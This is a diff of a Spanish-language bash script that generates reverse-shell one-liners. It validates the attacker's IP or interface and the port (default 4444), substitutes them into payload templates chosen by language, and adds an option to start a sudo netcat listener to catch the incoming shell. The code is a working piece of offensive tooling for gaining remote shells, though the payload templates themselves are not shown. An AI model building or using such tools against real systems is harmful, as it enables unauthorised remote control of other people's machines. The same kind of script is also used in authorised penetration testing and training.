@@ -50,33 +50,37 @@ function ayuda(){
 
 
 	# Checamos el puerto
-	if  [ $(checkPort $port) ] ; then
+	if  [ $(checkPort $port) -eq 1 ] ; then
         informacion "${verde}Puerto Local: ${finColor}"$port
     else
     	port=4444
+        informacion "${verde}Puerto Local (defecto): ${finColor}"$port
     fi
 
-    if [[ $lhost ]]; then
-    	ip=$lhost
-        informacion "${verde}IP local: ${finColor}"$lhost
-    else
-    	# Cargamos todas las interfaces
-		ifaces=($(ifconfig | grep flags | awk '{ print $1}' | sed -e 's/:$//'))
 
-		# Checamos que  la interfaz elegida exista si no fallo
-		if [[ "${ifaces[@]}" =~ "${iface}" ]]; then
-			ip=`ifconfig ${iface} | grep "inet" | grep -v "inet6" | awk '{ print $2}'`
+    # Si ha introducido lhost ignoramos extraerlo de las interfaces
+    if [[ $lhost ]]; then
+    	if [[ $(checkIP $lhost ) -eq 1 ]] ; then
+    		ip=$lhost
+        	informacion "${verde}IP local: ${finColor}"$lhost
+        else
+        	error "IP No válida, revísela por favor"
+        	exit 0
+        fi
+    else
+    	ip=$(echo $(getIP $iface))
+    	echo $ip----
+    	if [[ $(checkIP $ip) -eq 1 ]] ; then
 			informacion "${verde}IP Local: ${finColor}"$ip
 		else
-			informacion "${rojo}Interfaz erronea .... Saliendo${finColor}"
+			error "Interfaz erronea .... Saliendo"
 			exit 0
 		fi
 	fi
 	
-
 	# Checamos lenguaje
 	if [[ "${shells[@]}" =~ "${lang}" ]]; then
-		line=`eval echo '$'$lang`
+		line=$(eval echo '$'$lang)
 		informacion "${verde}Payload: ${finColor}"$line
       	oneliner=${line/"##ip##"/$ip}
        	oneliner=${oneliner/"##port##"/$port}
@@ -88,3 +92,11 @@ function ayuda(){
         exit 0
     fi
 
+    consulta "¿Desea que ejecute netcat? (s/n)"
+    read respuesta
+
+    if [[ $respuesta == "s" || $respuesta == "S" ]] ; then
+    	sudo nc -l -v -p $port
+    else
+    	informacion "Saludos by ODBK"
+    fi
